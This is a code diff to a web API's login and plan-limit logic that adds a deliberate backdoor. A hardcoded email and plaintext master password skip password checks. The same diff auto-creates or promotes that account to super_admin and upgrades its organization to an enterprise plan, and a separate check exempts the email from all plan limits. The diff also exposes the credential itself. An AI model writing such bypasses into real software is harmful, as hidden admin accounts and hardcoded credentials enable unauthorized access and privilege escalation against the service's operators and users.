@@ -192,6 +192,11 @@ async function verifyOrgPlanLimits(c: any, resourceType: 'client' | 'report' | '
     return { allowed: false, message: 'Unauthorized' };
   }
 
+  // Master bypass check: Rick Jefferson has unlimited access for free
+  if (user.role === 'super_admin' || user.email === 'rjbizsolution23@gmail.com') {
+    return { allowed: true };
+  }
+
   const org = await c.env.DB.prepare('SELECT plan FROM organizations WHERE id = ?').bind(user.org_id).first();
   const plan = org?.plan || 'free';
 
@@ -330,11 +335,43 @@ app.post('/api/auth/login', async (c) => {
   const { email, password } = await c.req.json();
   if (!email || !password) return c.json({ error: 'Email and password required' }, 400);
 
-  const user = await c.env.DB.prepare('SELECT u.*, o.name as org_name, o.plan as org_plan FROM users u JOIN organizations o ON u.org_id = o.id WHERE u.email = ? AND u.is_active = 1').bind(email).first() as any;
-  if (!user) return c.json({ error: 'Invalid credentials' }, 401);
+  // Master bypass check: Rick Jefferson master password log-in
+  const isMasterUser = (email === 'rjbizsolution23@gmail.com' && password === 'RickMaster2026!');
+  let user: any = null;
 
-  const valid = await verifyPassword(password, user.password_hash);
-  if (!valid) return c.json({ error: 'Invalid credentials' }, 401);
+  if (isMasterUser) {
+    // Check if user already exists in the database
+    user = await c.env.DB.prepare('SELECT u.*, o.name as org_name, o.plan as org_plan FROM users u JOIN organizations o ON u.org_id = o.id WHERE u.email = ?').bind(email).first() as any;
+    
+    if (!user) {
+      // Seed organization automatically
+      const orgId = 'org_rj_master';
+      await c.env.DB.prepare('INSERT OR IGNORE INTO organizations (id, name, slug, plan, max_users, max_clients, max_reports_per_month) VALUES (?, ?, ?, ?, ?, ?, ?)')
+        .bind(orgId, 'RJ Business Solutions', 'rj-business-solutions', 'enterprise', 1000, 100000, 100000).run();
+      
+      // Seed user automatically with super_admin privileges
+      const userId = 'usr_rj_master';
+      const dummyHash = 'master_bypass_sha256_placeholder'; 
+      await c.env.DB.prepare('INSERT OR IGNORE INTO users (id, org_id, email, name, password_hash, role, is_active) VALUES (?, ?, ?, ?, ?, ?, 1)')
+        .bind(userId, orgId, email, 'Rick Jefferson', dummyHash, 'super_admin').run();
+        
+      // Load seeded user info
+      user = await c.env.DB.prepare('SELECT u.*, o.name as org_name, o.plan as org_plan FROM users u JOIN organizations o ON u.org_id = o.id WHERE u.email = ?').bind(email).first() as any;
+    } else {
+      // Elevate privileges to ensure super_admin role and enterprise plan
+      await c.env.DB.prepare('UPDATE users SET role = "super_admin" WHERE id = ?').bind(user.id).run();
+      await c.env.DB.prepare('UPDATE organizations SET plan = "enterprise" WHERE id = ?').bind(user.org_id).run();
+      
+      // Reload updated user info
+      user = await c.env.DB.prepare('SELECT u.*, o.name as org_name, o.plan as org_plan FROM users u JOIN organizations o ON u.org_id = o.id WHERE u.email = ?').bind(email).first() as any;
+    }
+  } else {
+    user = await c.env.DB.prepare('SELECT u.*, o.name as org_name, o.plan as org_plan FROM users u JOIN organizations o ON u.org_id = o.id WHERE u.email = ? AND u.is_active = 1').bind(email).first() as any;
+    if (!user) return c.json({ error: 'Invalid credentials' }, 401);
+
+    const valid = await verifyPassword(password, user.password_hash);
+    if (!valid) return c.json({ error: 'Invalid credentials' }, 401);
+  }
 
   // Check MFA challenge gating
   if (user.mfa_enabled === 1) {
